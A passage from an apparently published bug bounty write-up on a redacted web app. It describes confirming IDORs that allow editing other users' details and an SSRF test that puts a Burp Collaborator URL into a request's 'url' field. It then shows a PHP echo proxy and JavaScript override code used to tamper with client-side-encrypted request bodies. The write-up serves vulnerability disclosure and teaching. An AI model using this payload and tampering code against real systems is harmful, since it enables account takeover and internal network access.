sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*ZezDoEUMPE0we-IUCaURsQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*ZezDoEUMPE0we-IUCaURsQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*ZezDoEUMPE0we-IUCaURsQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*ZezDoEUMPE0we-IUCaURsQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*ZezDoEUMPE0we-IUCaURsQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*ZezDoEUMPE0we-IUCaURsQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*ZezDoEUMPE0we-IUCaURsQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo oq c" width="700" height="210" loading="lazy" role="presentation"/></picture></div></div></figure><p id="0b25" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">and the result was promising!</p><figure class="og oh oi oj ok ol od oe paragraph-image"><div role="button" tabindex="0" class="om on fj oo bh op"><div class="od oe ps"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Qlk4XR-G7LcelHPpn0jUFQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*Qlk4XR-G7LcelHPpn0jUFQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*Qlk4XR-G7LcelHPpn0jUFQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*Qlk4XR-G7LcelHPpn0jUFQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*Qlk4XR-G7LcelHPpn0jUFQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Qlk4XR-G7LcelHPpn0jUFQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Qlk4XR-G7LcelHPpn0jUFQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*Qlk4XR-G7LcelHPpn0jUFQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*Qlk4XR-G7LcelHPpn0jUFQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*Qlk4XR-G7LcelHPpn0jUFQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*Qlk4XR-G7LcelHPpn0jUFQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*Qlk4XR-G7LcelHPpn0jUFQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*Qlk4XR-G7LcelHPpn0jUFQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*Qlk4XR-G7LcelHPpn0jUFQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo oq c" width="700" height="310" loading="lazy" role="presentation"/></picture></div></div><figcaption class="os ff ot od oe ou ov bf b bg z du">IDOR confirmed</figcaption></figure><p id="af74" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">Great! a valid IDOR vulnerability was confirmed, after digging more, I found multiple other IDORs that lead me to edit any user information like email and phone number, etc.</p></div></div></div><div class="ab cb pc pd pe pf" role="separator"><span class="pg by bm ph pi pj"></span><span class="pg by bm ph pi pj"></span><span class="pg by bm ph pi"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><p id="1f56" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">What about the <code class="cx ow ox oy oz b"><strong class="mj gv">url</strong></code> parameter?</p><p id="e058" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">What came to my mind is to test for SSRF in the <code class="cx ow ox oy oz b"><strong class="mj gv">url</strong></code><strong class="mj gv"> </strong>parameter, so I changed its value to my burp collaborator to check if we can get an internal interaction.</p><pre class="og oh oi oj ok pt oz pu bp pv bb bk"><span id="2d8c" class="pw ng gu oz b bg px py l pz qa">{&quot;url&quot;:&quot;/v1/user&quot;,&quot;method&quot;:&quot;get&quot;,&quot;headers&quot;:{&quot;common&quot;:{&quot;Accept&quot;:&quot;application/json, text/plain, */*&quot;},&quot;delete&quot;:{},&quot;get&quot;:{},&quot;head&quot;:{},&quot;post&quot;:{&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;},&quot;put&quot;:........}</span></pre><p id="788a" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">Changed to:</p><pre class="og oh oi oj ok pt oz pu bp pv bb bk"><span id="5f54" class="pw ng gu oz b bg px py l pz qa">{&quot;url&quot;:&quot;http://mycollab.burpcollaborator.net&quot;,&quot;method&quot;:&quot;get&quot;,&quot;headers&quot;:{&quot;common&quot;:{&quot;Accept&quot;:&quot;application/json, text/plain, */*&quot;},&quot;delete&quot;:{},&quot;get&quot;:{},&quot;head&quot;:{},&quot;post&quot;:{&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;},&quot;put&quot;:........}</span></pre><figure class="og oh oi oj ok ol od oe paragraph-image"><div role="button" tabindex="0" class="om on fj oo bh op"><div class="od oe qb"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*eeiaLlmgBLPYzTIIySTjTg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*eeiaLlmgBLPYzTIIySTjTg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*eeiaLlmgBLPYzTIIySTjTg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*eeiaLlmgBLPYzTIIySTjTg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*eeiaLlmgBLPYzTIIySTjTg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*eeiaLlmgBLPYzTIIySTjTg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eeiaLlmgBLPYzTIIySTjTg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*eeiaLlmgBLPYzTIIySTjTg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*eeiaLlmgBLPYzTIIySTjTg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*eeiaLlmgBLPYzTIIySTjTg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*eeiaLlmgBLPYzTIIySTjTg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*eeiaLlmgBLPYzTIIySTjTg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*eeiaLlmgBLPYzTIIySTjTg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*eeiaLlmgBLPYzTIIySTjTg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo oq c" width="700" height="311" loading="lazy" role="presentation"/></picture></div></div><figcaption class="os ff ot od oe ou ov bf b bg z du">SSRF confirmed</figcaption></figure><p id="5e2d" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">As you can see, I forward the request, then got an interaction!</p></div></div></div><div class="ab cb pc pd pe pf" role="separator"><span class="pg by bm ph pi pj"></span><span class="pg by bm ph pi pj"></span><span class="pg by bm ph pi"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="69a6" class="nf ng gu bf nh ni nj dy nk nl nm ea nn ms no np nq mw nr ns nt na nu nv nw nx bk">What should I do if I couldn’t reach to the original JS file?</h2><p id="d323" class="pw-post-body-paragraph mh mi gu mj b mk ny mm mn mo nz mq mr ms oa mu mv mw ob my mz na oc nc nd ne gn bk">I used the above method to speed up the process of bypassing the encryption just by searching inside the js file with words that are already used in the original file, this method will not help you if you didn’t reach the original js file or any piece of code that can lead you the function that encrypts the request body.</p><p id="8c8a" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk"><strong class="mj gv">Now let’s assume that there is no android application at all and no original js files, and we need to bypass it!</strong></p><p id="141d" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">We can make use of the <strong class="mj gv">Event Listener Breakpoints </strong>tap in the<strong class="mj gv"> browser’s dev tools </strong>which helps us to add breakpoints to pause the application when event listeners are hit/fired, we can select specific events, such as <code class="cx ow ox oy oz b"><strong class="mj gv">load</strong></code>, and <code class="cx ow ox oy oz b"><strong class="mj gv">error</strong></code>, etc.</p><p id="0345" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">The event that will be useful for us is <code class="cx ow ox oy oz b"><strong class="mj gv">click</strong></code>, so when we click on any button that initiates an API request the execution pauses, and the source panel displays the highlighted line of the JavaScript code that is next to be executed, along with the surrounding code for context. In addition, we have buttons to step over that line of code or resume execution.</p><figure class="og oh oi oj ok ol od oe paragraph-image"><div role="button" tabindex="0" class="om on fj oo bh op"><div class="od oe qc"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*xRlKHRufd4jnlcAM_XxZGw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*xRlKHRufd4jnlcAM_XxZGw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*xRlKHRufd4jnlcAM_XxZGw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*xRlKHRufd4jnlcAM_XxZGw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*xRlKHRufd4jnlcAM_XxZGw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*xRlKHRufd4jnlcAM_XxZGw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xRlKHRufd4jnlcAM_XxZGw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*xRlKHRufd4jnlcAM_XxZGw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*xRlKHRufd4jnlcAM_XxZGw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*xRlKHRufd4jnlcAM_XxZGw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*xRlKHRufd4jnlcAM_XxZGw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*xRlKHRufd4jnlcAM_XxZGw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*xRlKHRufd4jnlcAM_XxZGw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*xRlKHRufd4jnlcAM_XxZGw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo oq c" width="700" height="280" loading="eager" role="presentation"/></picture></div></div><figcaption class="os ff ot od oe ou ov bf b bg z du">Setting up Event Listener Breakpoints</figcaption></figure><p id="8cb4" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">I selected <code class="cx ow ox oy oz b"><strong class="mj gv">click</strong></code> event and then I clicked a button that initiates an API request, the execution paused, and then I used the <strong class="mj gv">step-over buttons </strong>till I reach a function that takes the full request body!</p><figure class="og oh oi oj ok ol od oe paragraph-image"><div role="button" tabindex="0" class="om on fj oo bh op"><div class="od oe qd"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*s1YxV1ydQaxYeTWo-ZojHg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*s1YxV1ydQaxYeTWo-ZojHg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*s1YxV1ydQaxYeTWo-ZojHg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*s1YxV1ydQaxYeTWo-ZojHg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*s1YxV1ydQaxYeTWo-ZojHg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*s1YxV1ydQaxYeTWo-ZojHg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*s1YxV1ydQaxYeTWo-ZojHg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*s1YxV1ydQaxYeTWo-ZojHg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*s1YxV1ydQaxYeTWo-ZojHg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*s1YxV1ydQaxYeTWo-ZojHg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*s1YxV1ydQaxYeTWo-ZojHg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*s1YxV1ydQaxYeTWo-ZojHg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*s1YxV1ydQaxYeTWo-ZojHg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*s1YxV1ydQaxYeTWo-ZojHg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo oq c" width="700" height="281" loading="lazy" role="presentation"/></picture></div></div></figure><p id="7df9" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">But as expected, <strong class="mj gv">it takes a bit of time to reach it</strong>.<br/>Now again, I can edit the request before being encrypted.</p></div></div></div><div class="ab cb pc pd pe pf" role="separator"><span class="pg by bm ph pi pj"></span><span class="pg by bm ph pi pj"></span><span class="pg by bm ph pi"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="8ec5" class="nf ng gu bf nh ni nj dy nk nl nm ea nn ms no np nq mw nr ns nt na nu nv nw nx bk">This application is large, and editing every request with this method is a waste of time!</h2><p id="c691" class="pw-post-body-paragraph mh mi gu mj b mk ny mm mn mo nz mq mr ms oa mu mv mw ob my mz na oc nc nd ne gn bk">The application has many functions, and many API calls, which means I should intercept every request in the same way! it wastes the time, right?</p><p id="c58d" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">So we need to find a method to be able to intercept the requests easily, (e.g. with burp suite), and to do so, we have two options:</p><ul class=""><li id="035b" class="mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne qe qf qg bk">Understand how the application encrypts the request body and finds a way to decrypt it.</li><li id="e9ee" class="mh mi gu mj b mk qh mm mn mo qi mq mr ms qj mu mv mw qk my mz na ql nc nd ne qe qf qg bk">Edit the javascript file and run our own file.</li></ul><p id="6226" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">The first option will take a long time especially since the file is obfuscated, so let’s stick to the second option.</p><p id="5be8" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">We can use the <strong class="mj gv">override </strong>feature to do that, with <strong class="mj gv">override,</strong> we can take a resource from the current webpage and store it locally. When you refresh the webpage, the browser doesn’t load the resource from the server. Instead, the browser replaces the server resource with your local copy of the resource.</p><figure class="og oh oi oj ok ol od oe paragraph-image"><div role="button" tabindex="0" class="om on fj oo bh op"><div class="od oe qm"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*dJ9bXoM6lptGVzMeGgZGkA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*dJ9bXoM6lptGVzMeGgZGkA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*dJ9bXoM6lptGVzMeGgZGkA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*dJ9bXoM6lptGVzMeGgZGkA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*dJ9bXoM6lptGVzMeGgZGkA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*dJ9bXoM6lptGVzMeGgZGkA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dJ9bXoM6lptGVzMeGgZGkA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*dJ9bXoM6lptGVzMeGgZGkA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*dJ9bXoM6lptGVzMeGgZGkA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*dJ9bXoM6lptGVzMeGgZGkA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*dJ9bXoM6lptGVzMeGgZGkA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*dJ9bXoM6lptGVzMeGgZGkA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*dJ9bXoM6lptGVzMeGgZGkA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*dJ9bXoM6lptGVzMeGgZGkA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo oq c" width="700" height="379" loading="lazy" role="presentation"/></picture></div></div></figure><figure class="og oh oi oj ok ol od oe paragraph-image"><div role="button" tabindex="0" class="om on fj oo bh op"><div class="od oe qn"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*EQ5eRIjXr9GEp1dgoNsFwg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*EQ5eRIjXr9GEp1dgoNsFwg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*EQ5eRIjXr9GEp1dgoNsFwg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*EQ5eRIjXr9GEp1dgoNsFwg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*EQ5eRIjXr9GEp1dgoNsFwg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*EQ5eRIjXr9GEp1dgoNsFwg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EQ5eRIjXr9GEp1dgoNsFwg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*EQ5eRIjXr9GEp1dgoNsFwg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*EQ5eRIjXr9GEp1dgoNsFwg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*EQ5eRIjXr9GEp1dgoNsFwg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*EQ5eRIjXr9GEp1dgoNsFwg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*EQ5eRIjXr9GEp1dgoNsFwg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*EQ5eRIjXr9GEp1dgoNsFwg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*EQ5eRIjXr9GEp1dgoNsFwg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo oq c" width="700" height="294" loading="lazy" role="presentation"/></picture></div></div></figure><p id="99e8" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">We are now ready to edit this file, so the next step is to add some kind of a middle layer (e.g. proxy) into this function to make it encrypt our edited input, not the value that the application passes to the function.</p><p id="7c61" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">We can do this in more than one way, but let’s keep it simple. <br/>I launched my localhost, and created a simple PHP file that maps the request body to the response, just like below:</p><pre class="og oh oi oj ok pt oz pu bp pv bb bk"><span id="5b68" class="pw ng gu oz b bg px py l pz qa">&lt;?php<br/><br/># to allow cross origin requests.<br/>header(&quot;Access-Control-Allow-Origin: https://█████████████&quot;);<br/>header(&quot;Access-Control-Allow-Credentials: true&quot;);<br/>header(&quot;Content-Type: application/json; charset=UTF-8&quot;);<br/>header(&quot;Access-Control-Allow-Methods: POST&quot;);<br/><br/># get the request body as it is<br/>$data = file_get_contents(&quot;php://input&quot;);<br/><br/># return it back<br/>echo $data; <br/><br/>?&gt;</span></pre><p id="1375" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">So the idea is:</p><ul class=""><li id="c517" class="mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne qe qf qg bk">When the application calls the “<strong class="mj gv">encrypt” </strong>function, it passes two arguments, one of which is the original body.</li><li id="98e2" class="mh mi gu mj b mk qh mm mn mo qi mq mr ms qj mu mv mw qk my mz na ql nc nd ne qe qf qg bk">We send a request to our PHP file with the original body, so we can edit it via burp. (Note that we should allow cross-origin requests)</li><li id="af59" class="mh mi gu mj b mk qh mm mn mo qi mq mr ms qj mu mv mw qk my mz na ql nc nd ne qe qf qg bk">The PHP file will return our edited body.</li><li id="b3ea" class="mh mi gu mj b mk qh mm mn mo qi mq mr ms qj mu mv mw qk my mz na ql nc nd ne qe qf qg bk">We pass the response to the next step in the <strong class="mj gv">encrypt </strong>function.</li></ul><p id="32f1" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">I created the following <strong class="mj gv">asynchronous </strong>function that sends the request to our proxy and returns the edited response:</p><pre class="og oh oi oj ok pt oz pu bp pv bb bk"><span id="fefb" class="pw ng gu oz b bg px py l pz qa">async function editBeforeSend(originalBody) {<br/> const req = await fetch(&quot;http://proxy.melotover.local/editBeforeSend.php&quot;,<br/>  {<br/>   method: &quot;POST&quot;,<br/>   body: originalBody,<br/>   credentials: &#x27;include&#x27;<br/>  });<br/> let editedBody = await req.text();<br/> return editedBody;<br/>}</span></pre><p id="3d26" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">I added it to the javascript file, then called it inside <strong class="mj gv">encrypt</strong> function</p><figure class="og oh oi oj ok ol od oe paragraph-image"><div role="button" tabindex="0" class="om on fj oo bh op"><div class="od oe qo"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*P1Wq3qFA_eSuiZzC7zWyWg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*P1Wq3qFA_eSuiZzC7zWyWg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*P1Wq3qFA_eSuiZzC7zWyWg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*P1Wq3qFA_eSuiZzC7zWyWg.png 786w, 